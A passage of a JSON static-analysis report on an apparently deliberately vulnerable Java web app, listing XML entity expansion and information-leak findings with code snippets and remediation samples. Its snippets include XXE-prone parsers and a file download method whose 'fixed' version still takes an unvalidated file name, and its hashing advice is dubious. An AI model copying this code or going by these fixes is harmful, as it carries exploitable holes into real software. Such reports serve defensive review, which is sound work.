ususally not recommended to apply the NIST SP 800-132 recommendation of using an iteration count of as high as 10,000,000 for critical keys (Fortify will always detect this as an issue if the iteration is less than 100,000, any less than 1,000 will fortify will report as severe issue and low for 1,000 and above), as this may cause a performance impact on the server running those iterations\n\nInstead, it is recommended to use a more secure Hashing algorithm available in Java such as SHA256, SHA384 and SHA512.\nThe recommendation is to change the algorithm instead of changing the iterations of PBEWithMD5AndDES.", "impact": "SHA256, SHA384 and SHA512 algorithm is slower compared to MD5, but more secure.", "abstract": "Use of SHA512 algorithm"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "XML Entity Expansion Injection": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00407", "function": "javax.xml.transform.sax.SAXSource.SAXSource()", "line": "627", "snippet": "//Do unmarshall operation\n\t        Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(),\n\t                                        new InputSource(file.getInputStream()));\n\n\t\t\tjaxbContext = JAXBContext.newInstance(EmployeeDtlsBean.class);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00405", "function": "javax.xml.parsers.DocumentBuilder.parse()", "line": "978", "snippet": "try {\n            builder = factory.newDocumentBuilder();\n            doc = builder.parse(rootPath);\n            doc=(Document) doc.createTextNode(\"<EmployeeInfo><employeedtl> <empName>Jhanvi 2</empName></employeedtl></EmployeeInfo>\");"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00406", "function": "javax.xml.parsers.DocumentBuilder.parse()", "line": "671", "snippet": "builder = factory.newDocumentBuilder();\n            doc = builder.parse(rootPath);\n\n            XPathFactory xpathFactory = XPathFactory.newInstance();"}]}], "remediation": null}, "System Information Leak: Internal": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00001", "function": "org.slf4j.Logger.error()", "line": "552", "snippet": "logger.error(\"Error during property file download - RSA encryption\",e.getMessage());\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(\"Error during property file download - RSA encryption\",e.getMessage());\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(\"Error during property file download - RSA encryption\",e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00002", "function": "org.slf4j.Logger.error()", "line": "408", "snippet": "logger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00003", "function": "org.slf4j.Logger.error()", "line": "302", "snippet": "* true; }\n\t */ catch (Exception e) {\n\t\t\tlogger.error(\"Error during JSON parse\"+e);\n\t\t\tisWrong = true;\n\t\t}"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00004", "function": "org.slf4j.Logger.error()", "line": "241", "snippet": "logger.error(\"Exception occured during user list\" + e.getMessage());\n\t\t} catch (IOException e) {\n\t\t\tlogger.error(\"Exception occured during user list\" + e.getMessage());\n\t\t} catch (SQLException e) {\n\t\t\tlogger.error(\"Exception occured during user list\" + e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00005", "function": "java.io.PrintStream.println()", "line": "603", "snippet": "String path = System.getProperty(\"user.dir\") + \"\\\\EmployeeInfo.xsd\";\n\t        \n\t        System.out.println(\"Working Directory = \" + path);\n\t\t\t\n\t\t\t  SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00006", "function": "org.slf4j.Logger.error()", "line": "1180", "snippet": "httpClient.close();\n\t\t} catch (Exception e) {\n\t\t\tlogger.error(\"Error during execution\"+e);\n\t\t}\n\t\treturn mv;"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00007", "function": "org.slf4j.Logger.error()", "line": "416", "snippet": "logger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (InvalidAlgorithmParameterException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());\n\t\t}"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00008", "function": "org.slf4j.Logger.error()", "line": "448", "snippet": "logger.error(\"Error during PBE encryption\", e.getMessage());\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(\"Error during PBE encryption\", e.getMessage());\n\t\t}"}]}, {"file": "src/com/accenture/sec/exception/GenericExceptionHandler.java", "items": [{"id": "IN00009", "function": "org.slf4j.Logger.error()", "line": "23", "snippet": "ModelAndView modelAndVew = new ModelAndView(\"failure\");\n\t\tlogger.error(mpex.getMessage());\n\t\tmodelAndVew.addObject(\"Error during file upload. Check input and try again\");\n\t\treturn modelAndVew;"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00010", "function": "org.slf4j.Logger.error()", "line": "442", "snippet": "logger.error(\"Error during PBE encryption\", e.getMessage());\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(\"Error during PBE encryption\", e.getMessage());\n\t\t} catch (InvalidAlgorithmParameterException e) {\n\t\t\tlogger.error(\"Error during PBE encryption\", e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00011", "function": "org.slf4j.Logger.error()", "line": "560", "snippet": "logger.error(\"Error during property file download - RSA encryption\",e.getMessage());\n\t\t} catch (NoSuchProviderException e) {\n\t\t\tlogger.error(\"Error during property file download - RSA encryption\",e.getMessage());\n\t\t}"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00012", "function": "org.slf4j.Logger.error()", "line": "556", "snippet": "logger.error(\"Error during property file download - RSA encryption\",e.getMessage());\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(\"Error during property file download - RSA encryption\",e.getMessage());\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(\"Error during property file download - RSA encryption\",e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00013", "function": "org.slf4j.Logger.error()", "line": "808", "snippet": "mv.addObject(\"dirlist\", dirList);\n\t\t\t} catch (IOException e) {\n\t\t\t\tlogger.error(\"Error in executing command\", e);\n\t\t\t\tmv.setViewName(\"failure\");\n\t\t\t\tmv.addObject(\"msg\", \"Error in executing command, check log for more information\");"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00014", "function": "org.slf4j.Logger.error()", "line": "151", "snippet": "departmentMap = employeeService.getDepartmentMap();\n\t\t} catch(ClassCastException e) {\n\t\t\tlogger.error(\"Error in fetching department values\", e);\n\t    \tModelAndView mv = new ModelAndView();\n\t\t\tmv.setViewName(\"failure\");"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00015", "function": "org.slf4j.Logger.error()", "line": "156", "snippet": "mv.addObject(\"msg\", \"Error in fetching department values\");\n\t\t}\tcatch (Exception e) {\n\t\t\tlogger.error(\"Error in fetching department values\", e);\n\t    \tModelAndView mv = new ModelAndView();\n\t\t\tmv.setViewName(\"failure\");"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00016", "function": "org.slf4j.Logger.error()", "line": "412", "snippet": "logger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00017", "function": "org.slf4j.Logger.error()", "line": "558", "snippet": "logger.error(\"Error during property file download - RSA encryption\",e.getMessage());\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(\"Error during property file download - RSA encryption\",e.getMessage());\n\t\t} catch (NoSuchProviderException e) {\n\t\t\tlogger.error(\"Error during property file download - RSA encryption\",e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00018", "function": "org.slf4j.Logger.error()", "line": "406", "snippet": "} catch (Exception e){\t \n\t    \tlogger.error(\"error in download\", e);\n\t\t\tmv.setViewName(\"failure\");\n\t        mv.addObject(\"msg\", \"Error in downloading file, check log for more information\");"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00019", "function": "org.slf4j.Logger.error()", "line": "467", "snippet": "} catch (NoSuchAlgorithmException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00020", "function": "org.slf4j.Logger.error()", "line": "867", "snippet": "}\n\t\t} catch (Exception e) {\n\t\t\tlogger.error(\"Error in deleting file\", e.getMessage());\n\t\t\tSystem.exit(99);\n\t\t}"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00021", "function": "org.slf4j.Logger.error()", "line": "414", "snippet": "logger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (InvalidAlgorithmParameterException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());"}]}, {"file": "src/com/accenture/sec/exception/GenericExceptionHandler.java", "items": [{"id": "IN00022", "function": "org.slf4j.Logger.error()", "line": "32", "snippet": "ModelAndView modelAndVew = new ModelAndView(\"failure\");\n\t\tlogger.error(ex.getMessage());\n\t\tmodelAndVew.addObject(\"Error during execution. Try again with valid input\");\n\t\treturn modelAndVew;"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00023", "function": "org.slf4j.Logger.error()", "line": "448", "snippet": "mv.setViewName(\"uploadFile\");\n\t    } catch (Exception e){\t \n\t    \tlogger.error(\"error in downloading property file\", e);\n\t\t\tmv.setViewName(\"failure\");\n\t        mv.addObject(\"msg\", \"Error in downloading property file, check log for more information\");"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00024", "function": "org.slf4j.Logger.error()", "line": "473", "snippet": "logger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00025", "function": "org.slf4j.Logger.error()", "line": "410", "snippet": "logger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00026", "function": "org.slf4j.Logger.error()", "line": "438", "snippet": "logger.error(\"Error during PBE encryption\", e.getMessage());\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(\"Error during PBE encryption\", e.getMessage());\n\t\t} catch (InvalidKeySpecException e) {\n\t\t\tlogger.error(\"Error during PBE encryption\", e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00027", "function": "org.slf4j.Logger.error()", "line": "475", "snippet": "logger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (UnsupportedEncodingException e) {\n\t\t\t// TODO Auto-generated catch block"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00028", "function": "org.slf4j.Logger.error()", "line": "1124", "snippet": "} catch (NamingException e) {\n\t\t\tlogger.error(\"Error during ldap search\",e);\n\t\t\tif(ctx!=null)\n\t\t\tctx.close();"}]}, {"file": "src/com/accenture/sec/exception/GenericExceptionHandler.java", "items": [{"id": "IN00029", "function": "org.slf4j.Logger.error()", "line": "41", "snippet": "ModelAndView modelAndVew = new ModelAndView(\"failure\");\n\t\tlogger.error(ex.getMessage());\n\t\tmodelAndVew.addObject(\"Error during SQL execution. Try again with valid input\");\n\t\treturn modelAndVew;"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00030", "function": "org.slf4j.Logger.error()", "line": "440", "snippet": "logger.error(\"Error during PBE encryption\", e.getMessage());\n\t\t} catch (InvalidKeySpecException e) {\n\t\t\tlogger.error(\"Error during PBE encryption\", e.getMessage());\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(\"Error during PBE encryption\", e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00031", "function": "org.slf4j.Logger.error()", "line": "647", "snippet": "logger.error(\"Error during xml processing\", e.getMessage());\n\t\t} catch (JAXBException e) {\n\t\t\tlogger.error(\"Error during xml processing\", e.getMessage());\n\t\t}"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00032", "function": "org.slf4j.Logger.error()", "line": "446", "snippet": "logger.error(\"Error during PBE encryption\", e.getMessage());\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(\"Error during PBE encryption\", e.getMessage());\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(\"Error during PBE encryption\", e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00033", "function": "org.slf4j.Logger.error()", "line": "406", "snippet": "} catch (NoSuchAlgorithmException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00034", "function": "org.slf4j.Logger.error()", "line": "554", "snippet": "logger.error(\"Error during property file download - RSA encryption\",e.getMessage());\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(\"Error during property file download - RSA encryption\",e.getMessage());\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(\"Error during property file download - RSA encryption\",e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00035", "function": "org.slf4j.Logger.error()", "line": "436", "snippet": "encrypted = Base64.getEncoder().encodeToString(enc);\n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\tlogger.error(\"Error during PBE encryption\", e.getMessage());\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(\"Error during PBE encryption\", e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00036", "function": "org.slf4j.Logger.error()", "line": "645", "snippet": "mv.addObject(\"msg\",\"XML is valid and employee details uploaded successfully\");\n\t\t} catch (IOException e) {\n\t\t\tlogger.error(\"Error during xml processing\", e.getMessage());\n\t\t} catch (JAXBException e) {\n\t\t\tlogger.error(\"Error during xml processing\", e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00037", "function": "org.slf4j.Logger.error()", "line": "469", "snippet": "logger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00038", "function": "org.slf4j.Logger.error()", "line": "550", "snippet": "} catch (NoSuchAlgorithmException e) {\n\t\t\tlogger.error(\"Error during property file download - RSA encryption\",e.getMessage());\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(\"Error during property file download - RSA encryption\",e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00039", "function": "org.slf4j.Logger.error()", "line": "366", "snippet": "isWrong = true;\n\t\t} catch (IOException e) {\n\t\t\tlogger.error(\"Error during JSON parse\"+e);\n\t\t\tisWrong = true;\n\t\t}"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00040", "function": "org.slf4j.Logger.error()", "line": "471", "snippet": "logger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(\"Error during AES encryption\", e.getMessage());"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00041", "function": "org.slf4j.Logger.error()", "line": "735", "snippet": "mv.addObject(\"dirlist\", dirList);\n\t\t\t} catch (IOException e) {\n\t\t\t\tlogger.error(\"Error in executing command\", e);\n\t\t\t\tmv.setViewName(\"failure\");\n\t\t\t\tmv.addObject(\"msg\", \"Error in executing command, check log for more information\");"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00042", "function": "org.slf4j.Logger.error()", "line": "444", "snippet": "logger.error(\"Error during PBE encryption\", e.getMessage());\n\t\t} catch (InvalidAlgorithmParameterException e) {\n\t\t\tlogger.error(\"Error during PBE encryption\", e.getMessage());\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(\"Error during PBE encryption\", e.getMessage());"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00043", "function": "org.slf4j.Logger.debug()", "line": "251", "snippet": "conn.close();\n\t\t\t\t\t} catch (SQLException e) {\n\t\t\t\t\t\tlogger.debug(\"Exception occurred while closing connection.\" + e.getMessage());\n\t\t\t\t\t\texception.addSuppressed(e);\n\t\t\t\t\t}"}]}], "remediation": {"remediation": {"@id": "R.0045", "@name": "System Information Leak: Internal", "@dateLastModified": "7/23/2020", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult Employees(int departmentID, int param)\n        {\n            List&lt;Employee&gt; emplist = null;\n            try\n            {\n                VulnAppDBEntities dBContext = new VulnAppDBEntities();\n                emplist= dBContext.Employees.Where(emp =&gt; emp.DepartmentId == departmentID).ToList();\n                foreach (var item in emplist)\n                {\n                    item.Salary = item.Salary / param;\n                }\n            }\n            catch (DivideByZeroException nullex)\n            {\n                string filePath = AppDomain.CurrentDomain.BaseDirectory.ToString() + &quot;\\\\Errors.txt&quot;;\n\n                using (StreamWriter writer = new StreamWriter(filePath, true))\n                {\n                    writer.WriteLine(&quot;Message: &quot; + nullex.Message + Environment.NewLine + <em class=\"red\">&quot;StackTrace: &quot; + nullex.StackTrace</em>\n                        + Environment.NewLine + &quot;Date: &quot; + DateTime.Now.ToString());\n                    writer.WriteLine(Environment.NewLine + &quot;-----------------------------------------------------------------------------&quot;\n                        + Environment.NewLine);\n                }\n                ViewData[&quot;ErrorMessage&quot;] = &quot;Divided by zero exception has occured. &quot; + nullex.Message.ToString();\n            }\n            catch (Exception ex)\n            {  \n                ViewData[&quot;ErrorMessage&quot;] = &quot;An error occurred on this page. &quot; + ex.Message.ToString();\n            }\n            return View(emplist);\n        }", "nonvulncode": "public ActionResult Employees(int departmentID, int param)\n        {\n            List&lt;Employee&gt; emplist = null;\n            try\n            {\n                VulnAppDBEntities dBContext = new VulnAppDBEntities();\n                emplist= dBContext.Employees.Where(emp =&gt; emp.DepartmentId == departmentID).ToList();\n                foreach (var item in emplist)\n                {\n                    item.Salary = item.Salary / param;\n                }\n            }\n            catch (DivideByZeroException nullex)\n            {\n                string filePath = AppDomain.CurrentDomain.BaseDirectory.ToString() + &quot;\\\\Errors.txt&quot;;\n                using (StreamWriter writer = new StreamWriter(filePath, true))\n                {\n                    writer.WriteLine(&quot;Message: &quot; + nullex.Message + Environment.NewLine + &quot;Date: &quot; + DateTime.Now.ToString()); //<em class=\"blue\">StactTrace is not include in the log</em>\n                    writer.WriteLine(Environment.NewLine + &quot;-----------------------------------------------------------------------------&quot;\n                        + Environment.NewLine);\n                }\n                ViewData[&quot;ErrorMessage&quot;] = &quot;Divided by zero exception has occured. &quot; + nullex.Message.ToString();\n            }\n            catch (Exception ex)\n            {  \n                ViewData[&quot;ErrorMessage&quot;] = &quot;An error occurred on this page. &quot; + ex.Message.ToString();\n            }\n            return View(emplist);\n        }", "comments": "System information leak can be avoided to an extent by replacing StackTrace (.Net) or printstacktrace(JAVA) with logger. But even with logger, we need to be avoid logging sensitive information.\n\nSensitive information must not be logged (including the stack trace use) because they may expose detailed information about the system.  \n\nTo the user, instead of displaying the exception message, display a generic, human-readable message (&quot;An error occurred, please try again. If you need to contact support, reference case number 36313.&quot;). Avoid providing information that is useful to attackers. \n\nOn the internal part, in the Server-side, log the error message, the stack trace and any pointer to the data used and associate it with the case number, so the support team can debug the code without having direct access to any PII. Storing information in the logger must still contain information that is useful to the application production team for troubleshooting. If required to log stack trace for debugging/troubleshooting, this log file has to be protected and it's access controlled (need to know basis).\n\nSAST tools will always detect an issue if you are using any method coming from the exception object even if there is no sensitive information being included in the logged.\n\nfor more information, see: https://www.loggly.com/blog/30-best-practices-logging-scale/ and \nhttps://michaelscodingspot.com/logging-in-dotnet/\n\nNote: SAST tools will always log this as an issue once it sees the StackTrace.", "impact": "No impact for the code performance.\n\nNeed to notify the monitoring / SIEM teams about any change on the logs fields / format. This may impact the correlation rules.\n\nOld logs that contain PII information must be properly secure. Depending to the access level, the application team must open an incident to the SOC to respond and investigate if data was leaked internally.", "abstract": "Use of Error message"}, {"@type": "JAVA/JSP", "vulncode": "public void downloadFile( @RequestParam(value=&quot;file&quot;)String name,HttpSession session,HttpServletResponse response) throws Exception {\n\t    try {\n\t        String filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t        String fileName = filePath + name;\n\t        File fileToDownload = new File(fileName);\n\t        InputStream inputStream = new FileInputStream(fileToDownload);\n\t        response.setContentType(&quot;application/force-download&quot;);\n\t        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=&quot;+fileName+&quot;.txt&quot;);\n\t        IOUtils.copy(inputStream, response.getOutputStream());\n\t        response.flushBuffer();\n\t        inputStream.close();\n\t    } catch (Exception e){\t \n\t       <em class=\"red\"> e.printStackTrace(); // Stacktrace might reveal sensitive file path information to console</em>\n\t    }\n\n\t}", "nonvulncode": "EmployeeController c<em class=\"bold\">lass</em>\n<em class=\"blue\">private static final Logger logger = LoggerFactory.getLogger(EmployeeController.class);</em>\npublic void downloadFile( @RequestParam(value=&quot;file&quot;)String name,HttpSession session,HttpServletResponse response) throws Exception {\n\t    try {\n\t        String filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t        String fileName = filePath + name;\n\t        File fileToDownload = new File(fileName);\n\t        InputStream inputStream = new FileInputStream(fileToDownload);\n\t        response.setContentType(&quot;application/force-download&quot;);\n\t        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=&quot;+fileName+&quot;.txt&quot;);\n\t        IOUtils.copy(inputStream, response.getOutputStream());\n\t        response.flushBuffer();\n\t        inputStream.close();\n\t    } catch (Exception e){\t \n\t    \t<em class=\"blue\">logger.error(&quot;Error in executing command, contact support team, case number 36313&quot;);</em>\n\t    \tModelAndView mv = new ModelAndView();\n\t\t\tmv.setViewName(&quot;failure&quot;);\n\t        mv.addObject(&quot;msg&quot;, &quot;Error in executing command, check log for more information&quot;);\n\t    }\n\n\t}", "comments": "System information leak can be avoided to an extent by replacing StackTrace (.Net) or printstacktrace(JAVA) with logger. But even with logger, we need to be avoid logging sensitive information.\n\nSensitive information must not be logged (including the stack trace use) because they may expose detailed information about the system.  \n\nTo the user, instead of displaying the exception message, display a generic, human-readable message (&quot;An error occurred, please try again. If you need to contact support, reference case number 36313.&quot;). Avoid providing information that is useful to attackers. \n\nOn the internal part, in the Server-side, log the error message, the stack trace and any pointer to the data used and associate it with the case number, so the support team can debug the code without having direct access to any PII. Storing information in the logger must still contain information that is useful to the application production team for troubleshooting. If required to log stack trace for debugging/troubleshooting, this log file has to be protected and it's access controlled (need to know basis).\n\nSAST tools will always detect an issue if you are using any method coming from the exception object even if there is no sensitive information being included in the logged.\n\nfor more information, see: https://www.loggly.com/blog/30-best-practices-logging-scale/ and \nhttps://michaelscodingspot.com/logging-in-dotnet/\n\nNote: SAST tools will always log this as an issue once it sees the StackTrace.", "impact": "No impact for the code performance.\n\nNeed to notify the monitoring / SIEM teams about any change on the logs fields / format. This may impact the correlation rules.\n\nOld logs that contain PII information must be properly secure. Depending to the access level, the application team must open an incident to the SOC to respond and investigate if data was leaked internally.", "abstract": "Use of logger"}]}, "mitigations": {"mitigation": [{"system": "Web Server / IIS", "configuration": "Web.config\nIIS Manager interface", "backend": "Nlog (Web.config):\n\nWeb.config\n&lt;nlog xmlns=&quot;http://www.nlog-project.org/schemas/NLog.xsd&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;\n    &lt;targets&gt;\n      &lt;target name=&quot;default&quot; xsi:type=&quot;File&quot;\n      fileName=&quot;logs/app-log.txt&quot;\n      archiveFileName=&quot;logs/archives/app-log.{#}.txt&quot;\n      archiveEvery=&quot;Day&quot;\n      archiveNumbering=&quot;Rolling&quot;\n      maxArchiveFiles=&quot;7&quot; /&gt;\n    &lt;/targets&gt;\n    &lt;rules&gt;\n      &lt;logger name=&quot;*&quot; minlevel=&quot;Debug&quot; maxlevel=&quot;Error&quot; writeTo=&quot;default&quot; /&gt;\n    &lt;/rules&gt;\n  &lt;/nlog&gt;\n\n\nHTTP Logging(IIS Manager interface) :\n\n1.Open Internet Information Services (IIS) Manager.\n2.In the Connections pane, expand the server name, expand Sites, and then navigate to the Web site or application for which you want to configure HTTP logging.\n3.In the Home pane, double-click Logging.\n4.In the Actions pane, click Enable to enable logging.\n5.Select the log file format you want to use for your site or application in the Format drop-down list, and, if you want to change the default location where IIS stores log files, type the path where you want to store the log files for the site or application in the Directory box.\n6.(Optional) If you selected W3C in the Format drop-down list in step 5, click Select Fields.\n7.(Optional) In the W3C Logging Fields dialog box, select the W3C fields you want to log, clear any W3C fields you do not want to log, and then click OK.\n8.In the Actions pane, click Apply.", "frontend": "LogEntry logEntry = new LogEntry();\nlogEntry.Priority = 2;\nlogEntry.Categories.Add(&quot;Trace&quot;);\nlogEntry.Categories.Add(&quot;UI Events&quot;);\n\nif (myLogWriter.ShouldLog(logEntry))\n{\n  // Event will be logged according to current configuration. Perform operations (possibly\n  // expensive) to gather additional information for the event to be logged. \n}\nelse\n{\n  // Event will not be logged. Your application can avoid the performance\n  // penalty of collecting information for an event that will not be logged.\n}\n\nRefernce : https://docs.microsoft.com/en-us/previous-versions/msp-n-p/ff664418(v=pandp.50)?redirectedfrom=MSDN", "comments": "There are many logging tools that can be configured on IIS, and below are provided 2 examples (NLog and IIS default logging)\nAll logs must be send to the SIEM tool: a central logs repository, with correlations and security events monitored. Talk to the central security to align the application specific SIEM use cases.\n\nNLog\nNLog will only produce output if having configured one (or more) NLog targets. NLog can be configured using XML by adding a NLog.config, that will be described in the page.\n\nOn the NLog.config file, set the proper log level: (e.g., &lt;variable name='globalLevel' value='debug'/&gt; )\nThe following log levels are supported.\n  - Fatal\n  - Error\n  - Warn\n  - Info\n  - Debug\n  - Trace\n \nmore information: https://github.com/nlog/NLog/wiki/Configuration-file\n\nHTTP Logging(IIS Manager interface) :\nThe &lt;httpLogging&gt; element allows you to configure IIS to generate log entries for only successful requests, failed requests, or both. After you configure logging for each Web site at the server level, you can use this element to enable selective logging for individual URLs. By default, HTTP logging is enabled for all requests on Internet Information Services (IIS) .\n\nReference:\n1. https://docs.microsoft.com/en-us/iis/configuration/system.webserver/httplogging#:~:text=In%20the%20Connections%20pane%2C%20expand,click%20Enable%20to%20enable%20logging.\n2. https://docs.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis\n3.https://www.finalanalytics.com/blog/configure-http-logging-in-iis\n4. https://docs.microsoft.com/en-us/iis/extensions/advanced-logging-module/advanced-logging-for-iis-custom-logging"}, {"system": "Web Server / Tomcat", "configuration": "web.xml\n\n   &lt;context-param&gt;\n        &lt;param-name&gt;log4jConfigLocation&lt;/param-name&gt;\n        &lt;param-value&gt;/WEB-INF/log4j.properties&lt;/param-value&gt;\n   &lt;/context-param&gt;\n\n-- log4j.properties will be fetched automatically, if placed in classpath, otherwise above configuration mentioning log4j.properties location is necessary", "backend": "log4j.properties //new property file added to enable log4j logger\n# Root logger option\nlog4j.rootLogger = DEBUG, file\n\n# Redirect log messages to a log file\nlog4j.appender.file = org.apache.log4j.RollingFileAppender\n#outputs to Tomcat home\nlog4j.appender.file.File = ${catalina.home}/logs/mysecapp.log\nlog4j.appender.file.MaxFileSize = 5MB\nlog4j.appender.file.MaxBackupIndex = 10\nlog4j.appender.file.layout = 